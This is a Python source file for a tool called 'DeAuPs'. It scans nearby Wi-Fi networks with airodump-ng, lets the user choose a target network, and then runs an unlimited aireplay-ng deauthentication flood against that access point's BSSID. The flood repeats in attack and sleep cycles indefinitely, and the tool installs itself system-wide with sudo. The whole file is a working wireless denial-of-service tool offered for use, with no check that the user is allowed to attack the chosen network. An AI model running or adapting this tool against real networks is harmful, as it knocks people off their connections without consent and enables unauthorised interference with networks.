import subprocess, time, sys, argparse, inquirer, re, random, string, os

from datetime import datetime







project = {}

red = "\033[1;31m"

green = "\033[1;32m"

yellow = "\033[1;33m"

blue = "\033[1;34m"

run = lambda cmd : subprocess.run( cmd, shell = True, check = True )

dream = lambda TIME : time.sleep( TIME )

uniqueName = lambda : f"DeAuPs-{ ''.join( random.choice( string.ascii_uppercase + string.ascii_lowercase + string.digits + '-_' ) for x in range( int( 5 ) ) ) }"

deleteDir = lambda : run( f"rm -rf ./{ project[ 'dirName' ] }" )

targetName = lambda nameOptionsList : inquirer.prompt( [ inquirer.List( "option", message = "Choose a target name", choices = nameOptionsList ) ] )[ "option" ]

nameOptions = lambda : [ x.strip() for x in [ [ x.strip() for x in open( f"./{ project[ 'dirName' ] }/wifiNames.py", "r" ).readlines() ] ][ 0 ] if x.strip() != "" ]

collectWifiNames = lambda : run( "sudo awk -F ',' '{ if ($1 ~ /Station/ || $1 ~ /BSSID/) next; print $%s }' ./%s/captureFile-02.csv | sort -u > ./%s/wifiNames.py" % ( getColumnNumber()[ "essidColumnNumber" ], project[ "dirName" ], project[ "dirName" ] ) )









def waiting( process = None, t = 15 ):

    sTime = time.time()

    length = 30

    while time.time() - sTime <= t:

        eTime = time.time() - sTime

        p = eTime / t

        if t == 15 and process == "captureProcess":

            line = f"\r{ green }Capturing wireless networks and informations: { '-' * int( length * p ):{ length }s} { int( p * 101 ) }%"

        else:

            line = f"\r{ green }{ process } : { int( p * 101 ) }%"

        sys.stdout.write( line )

        sys.stdout.flush()

        dream( 0.1 )









def install():

    try:

        run( "sudo touch ./deaups && sudo echo -e '#! /bin/bash\\npython3 /usr/local/bin/install.py \"$@\"' > ./deaups && sudo chmod +x ./deaups && sudo mv ./deaups /usr/local/bin/ && sudo mv ./install.py /usr/local/bin/" )

    except:

        print( f"{ blue }\nError in installation.\n" )

        sys.exit( 0 )









def checkDirLocation():

    try:

        location1 = subprocess.check_output( "ls /usr/local/bin/ | grep 'deaups'", shell = True, encoding = "utf-8" ).strip()

        location2 = subprocess.check_output( "ls /usr/local/bin/ | grep 'install.py'", shell = True, encoding = "utf-8" ).strip()

        if location1 and location2:

            return( True )

    except:

        return( False )









def getColumnNumber():

    smallProject = {}

    for x in [ y for y in range( 0, 20 ) ]:

        try:

            process = subprocess.Popen( "grep -i 'beacons.*channel\\|channel.*beacons' ./%s/captureFile-02.csv | head -n 1 | awk -F ',' '{ print $%s }'" % ( project[ "dirName" ], x ), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE )

            output, _ = process.communicate()

            if _ != b"":

                getColumnNumber()

            output = output.decode( "utf-8" ).strip()

            if output.lower() == "bssid":

                smallProject[ "bssidColumnNumber" ] = x

            elif output.lower() == "channel":

                smallProject[ "channelColumnNumber" ] = x

            elif output.lower() == "essid":

                smallProject[ "essidColumnNumber" ] = x

        except:

            getColumnNumber()

        finally:

            process.terminate()

            process.wait()

    if len( smallProject ) == 3:

        return( smallProject )

    else:

        getColumnNumber()









def startDeAuth():

    file = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "w" )

    process = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", project[ "bssid" ], project[ "interface" ] ], stdout = file, stderr = subprocess.PIPE )

    print( "\n" )

    waiting( process = f"{ yellow }{ str( int( project[ 'frequency' ] ) + 1 ) }. Attacking { project[ 'name' ] }", t = int( project[ "attack" ] ) )

    process.terminate()

    process.wait()

    file.close()

    try:

        file1 = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "r" )

        text1 = file1.read().strip()

        file1.close()

        searching1 = re.findall( r"but the AP uses channel (\S+)", text1, re.IGNORECASE )

        if len( searching1 ) == 0:

            print( f"\n{ green }{ addSpace() }  Access point uses the right channel." )

        else:

            print( f"\n\n{ blue }Channel reconfiguration to { searching1[ 0 ] }\n" )

            project[ "channel" ] = searching1[ 0 ]

            configChannel()

        file2 = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "r" )

        text2 = file2.read().strip()

        file2.close()

        searching2 = re.findall( r"No such BSSID available", text2, re.IGNORECASE )

        if len( searching2 ) == 0:

            print( f"{ green }{ addSpace() }  The BSSID found." )

        else:

            print( f"\n\n{ blue }ATWCS gets started.\n" )

            deleteDir()

            dream( 2 )

            start( restart = True )

    except:

        deleteDir()

        dream( 2 )

        start( restart = True )

    project[ "frequency" ] = int( project[ "frequency" ] ) + 1

    runTime = runningTime()

    print( f"{ addSpace() }  Operation time : { runTime[ 'hour' ] } hr and { runTime[ 'minute' ] } min" if runTime[ "hour" ] != "0" else f"{ addSpace() }  Operation time : { runTime[ 'minute' ] } min" )

    waiting( process = f"{ addSpace() }  Sleeping", t = int( project[ "sleep" ] ) )

    startDeAuth()









def addSpace():

    emptyString = ""

    for x in range( 0, len( str( project[ "frequency" ] ) ) ):

        emptyString += " "

    return( emptyString )









def configChannel():

    try:

        run( f"sudo iwconfig { project[ 'interface' ] } channel { project[ 'channel' ] }" )

    except:

        print( f"\n{ blue }Wifi may be turned off!\n" )

        deleteDir()

        dream( 2 )

        start( restart = True )









def getTargetChannel():

    run( "sudo grep -i '%s' ./%s/captureFile-02.csv | head -n 1 | awk -F ',' '{ print $%s }' > ./%s/targetChannel.py" % ( project[ "name" ], project[ "dirName" ], getColumnNumber()[ "channelColumnNumber" ], project[ "dirName" ] ) )

    dream( 0.2 )

    try:

        file = open( f"./{ project[ 'dirName' ] }/targetChannel.py", "r" )

        channel = file.read().strip()

        file.close()

        return( channel )

    except:

        deleteDir()

        dream( 2 )

        start( restart = True )









def getTargetBssid():

    run( "sudo grep -i '%s' ./%s/captureFile-02.csv | head -n 1 | awk -F ',' '{ print $%s }' > ./%s/targetBssid.py" % ( project[ "name" ], project[ "dirName" ], getColumnNumber()[ "bssidColumnNumber" ], project[ "dirName" ] ) )

    dream( 0.2 )

    try:

        file = open( f"./{ project[ 'dirName' ] }/targetBssid.py", "r" )

        BSSID = file.read().strip()

        file.close()

        return( BSSID )

    except:

        deleteDir()

        dream( 2 )

        start( restart = True )









def createCaptureFiles():

    file = open( f"./{ project[ 'dirName' ] }/captureFile-01.csv", "w" )

    process = subprocess.Popen( [ "sudo", "airodump-ng", "-w", f"./{ project[ 'dirName' ] }/captureFile", "--output-format", "csv", project[ "interface" ] ], stdout = file )

    waiting( "captureProcess" )

    process.terminate()

    process.wait()

    file.close()









def createDir():

    dirName = uniqueName()

    if os.path.exists( dirName ):

        createDir()

    run( f"sudo mkdir ./{ dirName }" )

    if os.path.exists( dirName ):

        project[ "dirName" ] = dirName

    else:

        createDir()









def start( restart = False ):

    try:

        createDir()

        createCaptureFiles()

        collectWifiNames()

        if len( nameOptions() ) == 0 and restart == False:

            print( f"\n\n{ blue }Make sure your network interface is in monitor mode.\n\n" )

            sys.exit( 0 )

        if restart == False:

            project[ "name" ] = targetName( nameOptions() )

            project[ "frequency" ] = 0

            project[ "startTime" ] = datetime.now().strftime( "%d.%m.%Y %I:%M%p" )

        if len( getTargetBssid() ) == 17 and len( re.findall( r"-", getTargetChannel(), re.IGNORECASE ) ) == 0:

            project[ "bssid" ] = getTargetBssid()

            project[ "channel" ] = getTargetChannel()

        else:

            deleteDir()

            dream( 2 )

            start( restart = True )

        configChannel()

        startDeAuth()

    except:

        deleteDir()

        dream( 2 )

        start( restart = True )









def getMoreOptions( option ):

    if option.no_sleep:

        project[ "attack" ] = 25

        project[ "sleep" ] = 0

    elif option.attack and option.sleep:

        try:

            if int( option.attack ) >= 25 and int( option.sleep ) >= 1:

                project[ "attack" ] = option.attack

                project[ "sleep" ] = option.sleep

            else:

                print( f"\n\n{ blue }The attack time must be at least 25 seconds and sleep time must be positive integer.\n\n" )

                sys.exit( 0 )

        except:

            print( f"\n\n{ blue }The attack time must be at least 25 seconds and sleep time must be positive integer.\n\n" )

            sys.exit( 0 )

    elif option.attack or option.sleep:

        print( f"\n\n{ blue }The option is missing.\n\n" )

        sys.exit( 0 )

    else:

        project[ "attack" ] = 25

        project[ "sleep" ] = 50









def runningTime():

    endTime = datetime.now().strftime( "%d.%m.%Y %I:%M%p" )

    sTime = datetime.strptime( project[ "startTime" ], "%d.%m.%Y %I:%M%p" )

    eTime = datetime.strptime( endTime, "%d.%m.%Y %I:%M%p" )

    runTime = eTime - sTime

    hour = runTime.total_seconds() // 3600

    minute = ( runTime.total_seconds() % 3600 ) // 60

    return( { "hour" : str( int( hour ) ), "minute" : str( int( minute ) ) } )









def main():

    if checkDirLocation() == True:

        createOption = argparse.ArgumentParser( description = "How to use?" )

        createOption.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )

        createOption.add_argument( "--no-sleep", action = "store_true", help = "Disable sleep mode" )

        createOption.add_argument( "-s", "--sleep", type = str, help = "Time for sleep mode" )

        createOption.add_argument( "-a", "--attack", type = str, help = "Time for attack mode" )

        option = createOption.parse_args()

        project[ "interface" ] = option.interface

        getMoreOptions( option )

        run( "sudo clear" )

        print( f"""{ green }

  __  ___ _       __  __ 
 /  )(_  /_| /  //__)(   
/(_/ /__(  |(__//   __)  
𝒯𝒽ℯ 𝓇ℯ𝓁𝒾𝒶𝒷𝓁ℯ                         


    """ )

        start()

    else:

        install()

        print( f'\n\n{ green }Run "\033[1mdeaups -i <interface>\033[0m"\n\n' )

        sys.exit( 0 )











if __name__ == "__main__":

    main()













